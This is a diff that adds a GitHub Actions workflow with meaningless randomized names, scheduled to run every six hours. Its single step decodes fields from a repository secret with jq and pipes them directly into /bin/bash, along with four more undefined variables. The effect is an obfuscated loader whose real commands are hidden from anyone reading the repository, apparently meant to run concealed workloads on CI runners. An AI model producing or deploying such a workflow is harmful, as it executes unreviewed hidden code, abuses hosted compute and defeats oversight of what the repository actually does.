@@ -1,0 +1,22 @@
+name: mahenge4645
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mahenge4645
+        env:
+          skd00: ${{ secrets.skd00 }}
+        run: |
+          echo $skd00 | jq -r .a4 | /bin/bash
+          echo $o68 | jq -r .ccq47770 | /bin/bash
+          echo $bn18450 | jq -r .cmea58043 | /bin/bash
+          echo $wjzxr63 | jq -r .h952 | /bin/bash
+          echo $hxv2444 | jq -r .cdu08962 | /bin/bash
+
